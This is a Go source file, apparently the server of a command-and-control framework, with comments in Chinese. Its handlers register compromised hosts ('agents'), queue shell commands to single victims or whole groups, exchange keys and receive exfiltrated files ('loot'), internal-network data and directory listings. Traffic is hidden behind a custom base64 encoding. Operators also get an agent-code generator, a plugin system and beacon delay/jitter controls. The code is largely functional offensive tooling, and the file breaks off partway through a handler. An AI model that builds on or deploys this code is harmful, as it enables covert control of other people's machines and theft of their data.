package main

import (
	"math/rand"
	"crypto/md5"
    "encoding/hex"
	"fmt"
	"html"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
    "net/url"
	"crypto/tls"
	"encoding/json"
	"bufio"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"flag"
	"time"
	"regexp"
    "bytes"
    "errors"
    "math"
    "reflect"
    "server/protocol"
    "server/client"
    "server/web_ui"
    "encoding/binary"
)
var (
	/*不可清理*/key_map = make(map[string]string)
	key1_map = make(map[string][]int)
	key2_map = make(map[string][]int)
	/*不可清理*/mutex   = &sync.Mutex{}

    // 客户端获取消息,前端插入消息
	msg_get_list []Msg_get
    //客户端发送结果,前端获取结果
    msg_result_list []Msg_result
    //存储客户端结果
    msg_map_list []Msg_result
    //客户端发送目录,前端获取目录
    msg_file_list []Msg_file
    //缓存客户端目录
    msg_file_cache []Msg_file

    /*不可清理*/base_map = make(map[string]string) //存
    /*不可清理*/uid_base = make(map[string]string) //写
    /*不可清理*/code_map = make(map[string]map[byte]int)
	/*不可清理*/shell_net_post = make(map[string]string)
    sessionSlice []string
    /*不可清理*/error_str string
    UploadFile_byte_parts = make(map[string][]byte)
    DownloadFile_byte_parts = make(map[string][]byte)
    parts_count = make(map[string]int)
    /*不可清理*/keyPartArr = make(map[string][]int)
    /*不可清理*/logger = &MyLog{}
    /*不可清理*/web_title string
    /*不可清理*/log_word = make(map[string]string)
    /*不可清理*/user_group = make(map[string]Data_user)
)
type Msg_file struct {
    Uid string `json:"uid"`
    Taskid string `json:"taskid"`
    File string `json:"file"`
}
type Msg_result struct {
    Uid string `json:"uid"`
    Result string `json:"result"`
    Taskid string `json:"taskid"`
}
type Msg_get struct {
    Ori_Msg string `json:"Ori_msg"`
    Encry_Msg string `json:"Encry_msg"`
    Uid string `json:"uid"`
    Taskid string `json:"taskid"`
}
type MainHandler struct{}
//无权限交互
func (m *MainHandler) Index(conn, Get_Msg,switch_key,encry_key,download,result,net,info,upload,list,
                            option,uid_,username_,hostname,keyPart,filekey,windows_pro,port string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
        base_rounds,exist_base := base_map[port]
        code_rounds,exist_code:= code_map[port]
        if !exist_base && !exist_code {
            return
        }
		switch r.Method {
		case http.MethodGet:
			// 处理 GET 请求
			op := r.URL.Query().Get(option)
            var uid string
            uidBytes := r.URL.Query().Get(uid_)
            if uidBytes != "" {
                uid_decode,_ := customBase64Decode(uidBytes,code_rounds)
                uid = string(uid_decode)
                if _, exists := uid_base[uid]; !exists {
                    uid_base[uid] = base_rounds
                }
            }
			switch op {
				case conn: //监听
                    clientIP := getClientIP(r)

                    shellname_get := r.URL.Query().Get(hostname)
                    shellname_c,_:= customBase64Decode(shellname_get,code_rounds)
                    shellname := string(shellname_c)

                    username_get := r.URL.Query().Get(username_)
                    username_c,_:= customBase64Decode(username_get,code_rounds)
                    username := string(username_c)

                    keyStr := Get_conn(uid, username, shellname, clientIP)
                    key_base := customBase64Encode([]byte(keyStr),base_rounds)
                    fmt.Fprint(w, key_base)                
				case Get_Msg: //获取指令
                    data := GetMsg(uid,base_rounds)
                    fmt.Fprint(w,data)
				case switch_key: //发送与交换密钥

                    byte_base_key_mid:= r.URL.Query().Get(keyPart)
                    key_decode, _ := customBase64Decode(byte_base_key_mid,code_rounds)
                    key_mid := string(key_decode)

				    err := Switch_key(uid,key_mid)
                    if err != nil {
                        return
                    }
				case encry_key: //获取未加密密钥
					func(uid string) {
						mutex.Lock()
						defer mutex.Unlock()
						for _, conn := range data_conn.Conns {
							if uid == conn.Uid {
								if conn.HostKey != "" && conn.HostKey != "null" {
                                    key_decode:= customBase64Encode([]byte(conn.HostKey),base_rounds)
									fmt.Fprint(w, key_decode)
									EncryptHostKey(conn.Uid,conn.HostKey)
									break
								}else{
									return
								}
							}
						}
					}(uid)
                case download:

                    filekey := r.URL.Query().Get(filekey)

                    fileByte, err := DownloadFile(uid,filekey,code_rounds)
                    if err != nil {
                        return
                    }
                    w.Header().Set("Content-Type", "application/octet-stream")
                    w.Header().Set("Accept-Ranges", "bytes")
                    w.Write(fileByte)
                    if f, ok := w.(http.Flusher); ok {
                        f.Flush()
                    }
			}
		case http.MethodPost:
			op := r.URL.Query().Get(option)
			switch op {
				case result: //写入结果
                    err := r.ParseForm()
                    if err != nil {
                        return
                    }
                    baseuid := r.FormValue(uid_)
                    if baseuid == "" {
                        return
                    }
                    Byteuid, err := customBase64Decode(baseuid, code_rounds)
                    if err != nil {
                        return
                    }
                    uid := string(Byteuid)
                    results := r.FormValue(result)
                    taskid := r.FormValue(info)
                    if results == "" || taskid == "" {
                        return
                    }
                    Results(uid, results, taskid, code_rounds)
                case net: //接收内网信息
                    err := r.ParseForm()
                    if err != nil {
                        return
                    }
                    baseuid := r.FormValue(uid_)
                    if baseuid == "" {
                        return
                    }
                    Byteuid, err := customBase64Decode(baseuid, code_rounds)
                    if err != nil {
                        return
                    }
                    uid := string(Byteuid)
                    results := r.FormValue(result)
                    if uid == "" || results == "" {
                        return
                    }
                    Net_results(uid, results, code_rounds)

                case info:  //接收客户端信息
                    err := r.ParseForm()
                    if err != nil {
                        return
                    }
                    baseuid := r.FormValue(uid_)
                    if baseuid == "" {
                        return
                    }
                    Byteuid, err := customBase64Decode(baseuid, code_rounds)
                    if err != nil {
                        return
                    }
                    uid := string(Byteuid)
                    encry_str := r.FormValue(result)
                    clientIP := getClientIP(r)
                    key, ok3 := key_map[uid]
                    if encry_str == "" || !ok3 {
                        return
                    }
                    if windows_pro == "group_pro" {
                        Windows_GetInfo(uid, encry_str, key, clientIP, code_rounds)
                    } else {
                        GetInfo(uid, encry_str, key, clientIP, code_rounds)
                    }

                case upload:
                    reader, err := r.MultipartReader()
                    if err != nil {
                        return
                    }
                    var uid, result_, filename string
                    var fileData []byte
                    for {
                        part, err := reader.NextPart()
                        if err == io.EOF {
                            break
                        }
                        if err != nil {
                            return
                        }
                        if part.FormName() == uid_ {
                            buf, _ := io.ReadAll(part)
                            baseuid := string(buf)
                            Byteuid, err := customBase64Decode(baseuid, code_rounds)
                            if err != nil {
                                return
                            }
                            uid = string(Byteuid)
                        }
                        if part.FormName() == result {
                            buf, _ := io.ReadAll(part)
                            result_ = string(buf)
                        }
                        if part.FormName() == upload {
                            filename = part.FileName()
                            fileData, err = io.ReadAll(part)
                            if err != nil {
                                return
                            }
                        }
                    }
                    // 只有全部字段都不为空且 tmpFile 不为 nil 时才调用
                    if uid != "" && result_ != "" && filename != "" && len(fileData) > 0 {
                        UploadFileHandler(uid, result_, filename, fileData, code_rounds)
                    }

                case list: //客户端写入目录
                    err := r.ParseForm()
                    if err != nil {
                        return
                    }
                    baseuid := r.FormValue(uid_)
                    if baseuid == "" {
                        return
                    }
                    Byteuid, err := customBase64Decode(baseuid, code_rounds)
                    if err != nil {
                        return
                    }
                    uid := string(Byteuid)
                    file := r.FormValue(result)
                    taskid := r.FormValue(info)
                    if file == "" || taskid == "" {
                        return
                    }
                    Put_file_list(uid, file, taskid, code_rounds)
			}
		}
	}
}
//有权限交互,必须先登录,此路由下不需要错误报错回显
func User_index(web_route string)http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		usernameCookie, err := r.Cookie("cookie")
        if err != nil {
            w.WriteHeader(http.StatusNotFound)
            fmt.Fprint(w, error_str)
            return
        }
        var foundUser bool
        for _, session := range sessionSlice {
            if session == usernameCookie.Value {
                foundUser = true
                break
            }
        }
        if !foundUser {
            w.WriteHeader(http.StatusNotFound)
            fmt.Fprint(w, error_str)
            return
        }
		switch r.Method {
			case http.MethodGet:
				op := r.URL.Query().Get("op")
				switch op{
					case "listen": //用户操作,第一次交互

                        username := r.URL.Query().Get("username")

						str := Listen(username)
                        fmt.Fprint(w, str)
					case "getResults": //用户操作，获取执行结果

                        uid := r.URL.Query().Get("uid")
                        Taskid := r.URL.Query().Get("Taskid")
					
                        results := Getresults(uid,Taskid)
                        fmt.Fprint(w,results)
					case "getOs": //获取操作系统

                        uid := r.URL.Query().Get("uid")

						func(uid string){
							mutex.Lock()
							defer mutex.Unlock()
							for i,client := range client_data.Clients{
								if uid == client.Uid{
									fmt.Fprintf(w, "%s",client_data.Clients[i].OS)
									break
								}
							}
						}(uid)
					case "insertKey": //插入密钥

                        uid := r.URL.Query().Get("uid")
                        username := r.URL.Query().Get("username")
                        shellname := r.URL.Query().Get("request")

                        mutex.Lock()
                        defer mutex.Unlock()
						Insert_key(uid, username,shellname)
					case "msg": //用户操作,写入指令

                        uid := r.URL.Query().Get("uid")
                        msg := r.URL.Query().Get("msg")
                        Taskid := r.URL.Query().Get("Taskid")

						err_str := Getcmd(uid,msg,Taskid)
                        if err_str != ""{
                            http.Error(w, "msg null", http.StatusInternalServerError)
                        }
                        json.NewEncoder(w).Encode(map[string]interface{}{
                            "code": "200",
                            "message": "Message sent successfully",
                        })
					case "delShellInnet": //用户操作删除内网

                        uid := r.URL.Query().Get("uid")
                        shellname := r.URL.Query().Get("request")
                        target := r.URL.Query().Get("target")

						str := Del_shell_innet(target,shellname,uid)
                        fmt.Fprintf(w,str)
					case "userIndex": //客户端信息

                        clientsCount := r.URL.Query().Get("clientsCount")
                        windows_pro := r.URL.Query().Get("group_pro")

                        if windows_pro == "group_pro"{
                            matchedClients, err := windows_pro_UserIndex(clientsCount)
                            if err != nil {
                                http.Error(w, err.Error(), http.StatusInternalServerError)
                                return
                            }
                            if matchedClients != nil {
                                w.Header().Set("Content-Type", "application/json")
                                err := json.NewEncoder(w).Encode(matchedClients)
                                if err != nil {
                                    http.Error(w, "json data error", http.StatusInternalServerError)
                                }
                            } else {
                                w.Header().Set("Content-Type", "text/plain")
                                w.Write([]byte("noNeeded"))
                            }
                        }else{
                            matchedClients, err := UserIndex(clientsCount)
                            if err != nil {
                                http.Error(w, err.Error(), http.StatusInternalServerError)
                                return
                            }
                            if matchedClients != nil {
                                w.Header().Set("Content-Type", "application/json")
                                err := json.NewEncoder(w).Encode(matchedClients)
                                if err != nil {
                                    http.Error(w, "json data error", http.StatusInternalServerError)
                                }
                            } else {
                                w.Header().Set("Content-Type", "text/plain")
                                w.Write([]byte("noNeeded"))
                            }
                        }
                    case "ServerIndex":

                        clientsCount := r.URL.Query().Get("clientsCount")

                        matchedClients, err := ServerIndex(clientsCount)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        if matchedClients != nil {
                            w.Header().Set("Content-Type", "application/json")
                            err := json.NewEncoder(w).Encode(matchedClients)
                            if err != nil {
                                http.Error(w, "json data error", http.StatusInternalServerError)
                            }
                        } else {
                            w.Header().Set("Content-Type", "text/plain")
                            w.Write([]byte("noNeeded"))
                        }
					case "delIndex": //删除第一次交互

                        uid := r.URL.Query().Get("uid")
					
                        DeleteEntry(uid)
					case "delInfo": //删除客户端

                        uid := r.URL.Query().Get("uid")
                        info := r.URL.Query().Get("info")

                        func(uid string, info string) {
                            mutex.Lock()
                            defer mutex.Unlock()
                            if info != "" {
                                for i := len(windows_client_data.Clients) - 1; i >= 0; i-- {
                                    client := windows_client_data.Clients[i]
                                    if uid == client.Uid {
                                        for j := len(server_data.Servers) - 1; j >= 0; j-- {
                                            if client.Server == server_data.Servers[j].Remark {
                                                if server_data.Servers[j].Clients > 0 {
                                                    server_data.Servers[j].Clients--
                                                }
                                            }
                                        }
                                        windows_client_data.Clients = append(windows_client_data.Clients[:i], windows_client_data.Clients[i+1:]...)
                                        delete(key_map, uid)
                                        keyPartArr[uid] = nil
                                        logStr := fmt.Sprintf(log_word["removed_agent"], uid)
                                        logger.WriteLog(logStr)
                                        w.Header().Set("Content-Type", "application/json")
                                        w.Write([]byte("{\"code\":\"200\",\"message\":\"agent has been removed\"}"))
                                        break
                                    }
                                }
                            }else{
                                for i := len(client_data.Clients) - 1; i >= 0; i-- {
                                    client := client_data.Clients[i]
                                    if uid == client.Uid {
                                        // 更新 server_data.Servers 的 Clients 数量
                                        for j := len(server_data.Servers) - 1; j >= 0; j-- {
                                            if client.Server == server_data.Servers[j].Remark {
                                                if server_data.Servers[j].Clients > 0 {
                                                    server_data.Servers[j].Clients--
                                                }
                                            }
                                        }
                                        client_data.Clients = append(client_data.Clients[:i], client_data.Clients[i+1:]...)
                                        delete(key_map, uid)
                                        keyPartArr[uid] = nil
                                        logStr := fmt.Sprintf(log_word["removed_agent"], uid)
                                        logger.WriteLog(logStr)
                                        w.Header().Set("Content-Type", "application/json")
                                        w.Write([]byte("{\"code\":\"200\",\"message\":\"agent has been removed\"}"))
                                        break
                                    }
                                }
                            }
                        }(uid, info)
					case "getFileList": //读取客户端目录
                        
                        uid := r.URL.Query().Get("uid")
                        Taskid := r.URL.Query().Get("Taskid")
                        
						file_str := Get_file_list(uid,Taskid)
                        if file_str != ""{
                            fmt.Fprintf(w,file_str)
                        }
                    case "downloadlog": //下载日志
                        // 使用系统默认临时目录
                        logFilePath := "server.log"
                        file, err := os.Open(logFilePath)
                        if err != nil {
                            http.Error(w, "failed to open log file", http.StatusInternalServerError)
                            return
                        }
                        defer file.Close()
                        w.Header().Set("Content-Disposition", "attachment; filename="+filepath.Base(logFilePath))
                        w.Header().Set("Content-Type", "application/octet-stream")
                        w.Header().Set("Content-Transfer-Encoding", "binary")
                        w.Header().Set("Cache-Control", "no-cache")
                        http.ServeContent(w, r, logFilePath, time.Now(), file)
                    case "logRead":
                        pos := r.URL.Query().Get("pos")
                        posInt, err := strconv.Atoi(pos)
                        if err != nil {
                            http.Error(w, "invalid pos", http.StatusBadRequest)
                            return
                        }
                        lines, err := Log_read(posInt)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        w.Header().Set("Content-Type", "application/json")
                        json.NewEncoder(w).Encode(lines)                    
					case "getCurrentDir": //查询当前目录

                        uid := r.URL.Query().Get("uid")

						func(uid string){
							mutex.Lock()
							defer mutex.Unlock()
							for i,client := range client_data.Clients{
								if uid == client.Uid{
									fmt.Fprint(w, client_data.Clients[i].CurrentDir)
									break
								}
							}
						}(uid)
					case "getFile": //获取所有用户战利品

                        username := r.URL.Query().Get("username")

						Get_loots(username,web_route,w,r)
                    case "client_loot":
                        loot_list := Get_loot_windowsPro()
                        w.Header().Set("Content-Type", "application/json")
                        if err := json.NewEncoder(w).Encode(loot_list); err != nil {
                            http.Error(w, "json error", http.StatusInternalServerError)
                            return
                        }
                    case "download_loot":
                        uid := r.URL.Query().Get("uid")
                        file := r.URL.Query().Get("file")
                        if uid == "" || file == "" {
                            http.Error(w, "uid and file parameters are required", http.StatusBadRequest)
                            return
                        }
                        filePath := filepath.Join("uploads", uid, file)
                        if _, err := os.Stat(filePath); os.IsNotExist(err) {
                            http.Error(w, "file not found", http.StatusNotFound)
                            return
                        }
                        w.Header().Set("Content-Disposition", "attachment; filename="+strconv.Quote(file))
                        w.Header().Set("Content-Type", "application/octet-stream")
                        w.Header().Set("Content-Transfer-Encoding", "binary")
                        w.Header().Set("Cache-Control", "no-cache")
                        http.ServeFile(w, r, filePath)
                    case "getAll": //获取用户名下客户端

                        username := r.URL.Query().Get("username")

                        shell_list, err := Get_Clients(username)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        w.Header().Set("Content-Type", "application/json")
                        if err := json.NewEncoder(w).Encode(shell_list); err != nil {
                            http.Error(w, "json error", http.StatusInternalServerError)
                            return
                        }
					case "getShellInnet": //获取客户端内网IP

                        uid := r.URL.Query().Get("uid")

						func(uid string){
							mutex.Lock()
							defer mutex.Unlock()
							for i,client := range client_data.Clients{
								if uid == client.Uid{
									fmt.Fprintf(w, "%s",client_data.Clients[i].LocalIP)
									break
								}
							}
						}(uid)
                    case "net_getresults": // 获取客户端内网资产

                        uid := r.URL.Query().Get("uid")

                        result, err := Net_getresults(uid)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusBadRequest)
                            return
                        }
                        fmt.Fprint(w, result)                    
					case "getInnet": //查询内网资产

                        uid := r.URL.Query().Get("uid")

						getInnet(uid,w)
					case "AllMsg": //集体指令

                        msg := r.URL.Query().Get("msg")
                        username := r.URL.Query().Get("username")
                        osType := r.URL.Query().Get("osType")
                        Taskid := r.URL.Query().Get("Taskid")

						getAll(username,msg,osType,Taskid)
                    case "checkTime":
                        checkMap, err := Check_Time()
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        w.Header().Set("Content-Type", "application/json")
                        err = json.NewEncoder(w).Encode(checkMap)
                        if err != nil {
                            http.Error(w, "Failed to encode JSON", http.StatusInternalServerError)
                        }
                    case "check_time_pro":
                        checkMap, err := Check_Time_Pro()
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        w.Header().Set("Content-Type", "application/json")
                        err = json.NewEncoder(w).Encode(checkMap)
                        if err != nil {
                            http.Error(w, "Failed to encode JSON", http.StatusInternalServerError)
                        }
                    case "checkclient":
                        checkMap, err := Check_clients()
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        w.Header().Set("Content-Type", "application/json")
                        err = json.NewEncoder(w).Encode(checkMap)
                        if err != nil {
                            http.Error(w, "Failed to encode JSON", http.StatusInternalServerError)
                        }
                    case "confirm":

                        uid := r.URL.Query().Get("uid")
                        username := r.URL.Query().Get("username")

                        client, err := Confirm_chan(uid, username)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusNotFound)
                            return
                        }
                        w.Header().Set("Content-Type", "application/json")
                        jsonData, err := json.Marshal(client)
                        if err != nil {
                            http.Error(w, err.Error(), http.StatusInternalServerError)
                            return
                        }
                        w.Write(jsonData)
                    case "agentcode":

                        uid := r.URL.Query().Get("uid")
                        username := r.URL.Query().Get("username")
                        user := r.URL.Query().Get("user")
                        hostname := r.URL.Query().Get("hostname")
                        keyPart := r.URL.Query().Get("keyPart")
                        filekey := r.URL.Query().Get("filekey")
                        ptc := r.URL.Query().Get("protocol")
                        _os := r.URL.Query().Get("os")
                        server := r.URL.Query().Get("server")
                        Path := r.URL.Query().Get("Path")
                        ConnPath := r.URL.Query().Get("ConnPath")
                        MsgPath := r.URL.Query().Get("MsgPath")
                        switch_key := r.URL.Query().Get("switch_key")
                        encry_key := r.URL.Query().Get("encry_key")
                        download := r.URL.Query().Get("download")
                        result := r.URL.Query().Get("result")
                        _net := r.URL.Query().Get("net")
                        info := r.URL.Query().Get("info")
                        upload := r.URL.Query().Get("upload")
                        list := r.URL.Query().Get("list")
                        option := r.URL.Query().Get("option")
                        code_ := r.URL.Query().Get("code")
                        windows_pro := r.URL.Query().Get("group_pro")
                        port := strings.Split(server,":")[1]
                        base_rounds,_exist := base_map[port]
                        if !_exist {
                            return
                        }
                        code := client.Generate_agent(ptc,_os,server,Path,ConnPath,MsgPath,switch_key,
                            encry_key,download,result,_net,info,upload,list,option,username,user,uid,
                            hostname,keyPart,filekey,code_,base_rounds,windows_pro)
                        fmt.Fprint(w, code)
                    case "delserver":

                        port := r.URL.Query().Get("port")

                        found := false
                        for i, server := range server_data.Servers {
                            if port == server.Port {
                                if server.Clients != 0 {
                                    delete(base_map, port)
                                    delete(code_map, port)
                                    stop_str := fmt.Sprintf(log_word["stop_server"])
                                    fmt.Fprint(w, stop_str)
                                    logger.WriteLog(stop_str)
                                    return
                                }
                                protocol.StopServer(port)
                                server_data.Servers = append(server_data.Servers[:i], server_data.Servers[i+1:]...)
                                found = true
                                stop_str := fmt.Sprintf(log_word["removed_server"], port)
                                logger.WriteLog(stop_str)
                                break
                            }
                        }
                        if !found {
                            stop_str := fmt.Sprintf(log_word["no_found_server"], port)
                            logger.WriteLog(stop_str)
                        }
                    case "getloot":

                        uid := r.URL.Query().Get("uid")
                        file := r.URL.Query().Get("file")

                        if uid == "" || file == "" {
                            http.Error(w, "no parameter", http.StatusBadRequest)
                            return
                        }
                        filePath := filepath.Join("uploads", uid, file)
                        if _, err := os.Stat(filePath); os.IsNotExist(err) {
                            http.Error(w, "no file", http.StatusNotFound)
                            return
                        }
                        w.Header().Set("Content-Disposition", "attachment; filename="+strconv.Quote(file))
                        w.Header().Set("Content-Type", "application/octet-stream")
                        w.Header().Set("Content-Transfer-Encoding", "binary")
                        w.Header().Set("Cache-Control", "no-cache")
                        http.ServeFile(w, r, filePath)
                    case "changeMsh":
                        //列表插队

                        uid := r.URL.Query().Get("uid")
                        s_id := r.URL.Query().Get("s_id")
                        pos := r.URL.Query().Get("pos")

                        ChangeMsh(uid,s_id,pos)
                    case "getMsgList":

                        uid := r.URL.Query().Get("uid")

                        //消息带结果，获取msg_get中uid对应的消息
                        msgList := GetMsgList(uid)
                        w.Header().Set("Content-Type", "application/json; charset=utf-8")
                        json.NewEncoder(w).Encode(map[string][]string{
                            "messages": msgList,
                        })
                    //按索引msg_get中uid对应的消息
                    case "delMsgGet":

                        uid := r.URL.Query().Get("uid")
                        indexStr := r.URL.Query().Get("index")

                        mutex.Lock()
                        defer mutex.Unlock()
                        index, err := strconv.Atoi(indexStr)
                        if err != nil {
                            http.Error(w, "invalid index", http.StatusBadRequest)
                            return
                        }
                        // 找出属于 uid 的所有消息的全局索引
                        var uidIndices []int
                        for i, msg := range msg_get_list {
                            if msg.Uid == uid {
                                uidIndices = append(uidIndices, i)
                            }
                        }
                        if index < 0 || index >= len(uidIndices) {
                            http.Error(w, "index out of range", http.StatusBadRequest)
                            return
                        }
                        delIdx := uidIndices[index]
                        // 删除对应全局索引的消息
                        msg_get_list = append(msg_get_list[:delIdx], msg_get_list[delIdx+1:]...)
                        fmt.Fprintf(w, "msg_get_list for uid %s at index %d deleted successfully", uid, index)                
                    //按索引删除msg_map中uid对应的消息
                    case "delMsgMap":

                        uid := r.URL.Query().Get("uid")
                        indexStr := r.URL.Query().Get("index")

                        mutex.Lock()
                        defer mutex.Unlock()
                        index, err := strconv.Atoi(indexStr)
                        if err != nil {
                            http.Error(w, "invalid index", http.StatusBadRequest)
                            return
                        }
                        // 找到 uid 在 msg_map_list 中所有消息的全局索引列表
                        var uidIndices []int
                        for i, msg := range msg_map_list {
                            if msg.Uid == uid {
                                uidIndices = append(uidIndices, i)
                            }
                        }
                        if index < 0 || index >= len(uidIndices) {
                            http.Error(w, "index out of range", http.StatusBadRequest)
                            return
                        }
                        // 真实全局索引
                        delIdx := uidIndices[index]
                        // 删除该条消息
                        msg_map_list = append(msg_map_list[:delIdx], msg_map_list[delIdx+1:]...)
                        fmt.Fprintf(w, "msg_map_list for uid %s at index %d deleted successfully", uid, index)                
                    case "getMsgPost":

                        uid := r.URL.Query().Get("uid")

                        mutex.Lock()
                        var msgList []string
                        for _, msg := range msg_map_list {
                            if msg.Uid == uid {
                                msgList = append(msgList, msg.Taskid+":"+msg.Result)
                            }
                        }
                        mutex.Unlock()
                        w.Header().Set("Content-Type", "application/json; charset=utf-8")
                        json.NewEncoder(w).Encode(map[string][]string{
                            "messages": msgList,
                        })
                    //获取插件
                    case "getPlugin":

                        _os := r.URL.Query().Get("os")
                        remark := r.URL.Query().Get("remark")

                        mutex.Lock()
                        defer mutex.Unlock()
                        //创建切片
                        code_silce := make([]string, 0)
                        for _, plugin := range server_plugin.Plugins {
                            if plugin.Remark == remark && plugin.os == _os {
                                // 返回插件的详细信息
                                code_silce = append(code_silce,plugin.Code)
                            }
                        }
                        if code_silce != nil && len(code_silce) > 0 {
                            w.Header().Set("Content-Type", "application/json")
                            json.NewEncoder(w).Encode(map[string][]string{
                                "code": code_silce,
                            })
                        } else {
                            w.Header().Set("Content-Type", "application/json")
                            json.NewEncoder(w).Encode(map[string][]string{
                                "code": {"/*code*/"},
                            })
                        }
                    //按索引和os与remark删除插件
                    case "delPlugin":

                        _os := r.URL.Query().Get("os")
                        indexStr := r.URL.Query().Get("index")
                        remark := r.URL.Query().Get("remark")
                        
                        mutex.Lock()
                        defer mutex.Unlock()
                        index, err := strconv.Atoi(indexStr)
                        if err != nil {
                            http.Error(w, "invalid index", http.StatusBadRequest)
                            return
                        }
                        if index < 0 || index >= len(server_plugin.Plugins) {
                            http.Error(w, "index out of range", http.StatusBadRequest)
                            return
                        }
                        // 检查插件是否存在
                        if index < len(server_plugin.Plugins) && server_plugin.Plugins[index].Remark == remark && server_plugin.Plugins[index].os == _os {
                            // 删除指定索引的插件
                            server_plugin.Plugins = append(server_plugin.Plugins[:index], server_plugin.Plugins[index+1:]...)
                            fmt.Fprintf(w, "Plugin at index %d for remark %s and os %s deleted successfully", index, remark, _os)
                        } else {
                            http.Error(w, fmt.Sprintf("No plugin found at index %d for remark %s and os %s", index, remark, _os), http.StatusNotFound)
                            return
                        }
                    case "delFileList":

                        uid := r.URL.Query().Get("uid")
                        indexStr := r.URL.Query().Get("index")

                        Del_file_list(uid, indexStr)
                        w.Header().Set("Content-Type", "application/json")
                        json.NewEncoder(w).Encode(map[string]string{
                            "code": "200",
                            "message": "File deleted successfully",
                        })
                    case "readFileList":

                        uid := r.URL.Query().Get("uid")

                        fileList := Read_file_list(uid)
                        // 返回 JSON 格式的文件列表
                        w.Header().Set("Content-Type", "application/json")
                        json.NewEncoder(w).Encode(map[string]interface{}{
                            "code": "200",
                            "data": fileList,
                        })
                    case "cleanup":
                        ClearUnmarkedGlobalVars()
				}
			case http.MethodPost:
				op := r.URL.Query().Get("op")
				switch op{
                    case "uploadFile":
                        uid := r.FormValue("uid")
                        file, _, err := r.FormFile("uploadFile")
                        filename := r.FormValue("filename")
                        splitSize := r.FormValue("splitSize")
                        if err != nil {
                            http.Error(w, "parameter does not exist", http.StatusInternalServerError)
                            return
                        }
                        defer file.Close()
                        // 调用处理文件的函数
                        UserUploadFile(uid,filename,splitSize,file)   
                    case "change_pro":
                        var requestData struct {
                            UID      string `json:"uid"`
                            Username string `json:"username"`
                            Remarks  string `json:"remarks"`
                            Delay    string `json:"delay"`
                            Jitter   string `json:"jitter"`
                            Taskid  string `json:"taskid"` // 添加 Taskid 字段
                        }
                        decoder := json.NewDecoder(r.Body)
                        err := decoder.Decode(&requestData)
                        if err != nil {
                            http.Error(w, "Failed to decode JSON", http.StatusBadRequest)
                            return
                        }
                        result := Change_pro(requestData.UID, requestData.Username, requestData.Remarks, requestData.Delay, requestData.Jitter, requestData.Taskid)
                        w.Header().Set("Content-Type", "application/json")
                        switch result {
                            case "confirm":
                                w.WriteHeader(http.StatusOK)
                                json.NewEncoder(w).Encode(map[string]string{
                                    "code":    "200",
                                    "status":  "success",
                                    "message": "changes applied",
                                })
                            case "nil":
                                w.WriteHeader(http.StatusNotFound)
                                json.NewEncoder(w).Encode(map[string]string{
                                    "code":    "404",
                                    "status":  "error",
                                    "message": "client not found",
                                })
                            default:
                                w.WriteHeader(http.StatusBadRequest)
                                json.NewEncoder(w).Encode(map[string]string{
                                    "code":    "400",
                                    "status":  "error",
                                    "message": result,
                                })
                        }
                    case "change":
                        var requestData struct {
                            UID      string `json:"uid"`
                            Username string `json:"username"`
                            Remarks  string `json:"remarks"`
                            Delay    string `json:"delay"`
                            Jitter   string `json:"jitter"`
                            Taskid  string `json:"taskid"` // 添加 Taskid 字段
                        }
                        decoder := json.NewDecoder(r.Body)
                        err := decoder.Decode(&requestData)
                        if err != nil {
                            http.Error(w, "Failed to decode JSON", http.StatusBadRequest)
                            return
                        }
                        result := Change(requestData.UID, requestData.Username, requestData.Remarks, requestData.Delay, requestData.Jitter, requestData.Taskid)
                        w.Header().Set("Content-Type", "application/json")
                        switch result {
                            case "confirm":
                                w.WriteHeader(http.StatusOK)
                                json.NewEncoder(w).Encode(map[string]string{
                                    "code":    "200",
                                    "status":  "success",
                                    "message": "changes applied",
                                })
                            case "nil":
                                w.WriteHeader(http.StatusNotFound)
                                json.NewEncoder(w).Encode(map[string]string{
                                    "code":    "404",
                                    "status":  "error",
                                    "message": "client not found",
                                })
                            default:
                                w.WriteHeader(http.StatusBadRequest)
                                json.NewEncoder(w).Encode(map[string]string{
                                    "code":    "400",
                                    "status":  "error",
                                    "message": result,
                                })
                        }
                    case "insertPlugin":
                        // 插入插件
                        var requestData struct {
                            Remark         string `json:"remark"`
                            Code           string `json:"code"`
                            CodeWords      string `json:"codeWords"`
                            Os             string `json:"os"`
                            Parameter      string `json:"parameter"`
                            ParameterDesc  string `json:"parameterDesc"`
                        }
                        decoder := json.NewDecoder(r.Body)
                        err := decoder.Decode(&requestData)
                        if err != nil {
                            http.Error(w, "Failed to decode JSON", http.StatusBadRequest)
                            return
                        }
                        if requestData.Remark == "" || requestData.Code == "" || requestData.Os == "" {
                            http.Error(w, "parameter does not exist", http.StatusBadRequest)
                            return
                        }
                        // codeword是否重复冲突
                        for _, plugin := range server_plugin.Plugins {
                            if plugin.CodeWord == requestData.CodeWords && plugin.os == requestData.Os && plugin.Remark == requestData.Remark {
                                http.Error(w, "CodeWords already exists: "+requestData.CodeWords, http.StatusBadRequest)
                                return
                            }
                        }
                        //用逗号分割parameter
                        parameterParts := strings.Split(requestData.Parameter, ",")
                        //如果分割不了那就是只有一个参数
                        if len(parameterParts) == 1 && parameterParts[0] != "" {
                            parameterParts = []string{parameterParts[0]}
                        }
                        if parameterParts == nil || len(parameterParts) == 0 {
                            http.Error(w, "Parameter fields must not be empty", http.StatusBadRequest)
                            return
                        }
                        ParameterDesc := strings.Split(requestData.ParameterDesc, ",")
                        if len(parameterParts) == 1 && parameterParts[0] != "" {
                            ParameterDesc = []string{ParameterDesc[0]}
                        }
                        // 检查参数是否重复和不为空
                        paramSet := make(map[string]bool)
                        for _, p := range parameterParts {
                            if paramSet[p] {
                                http.Error(w, "Parameter fields must not duplicate: "+p, http.StatusBadRequest)
                                return
                            }
                            if p != "" {
                                paramSet[p] = true
                            }
                        }
                        // 插入插件到 serverPlugin
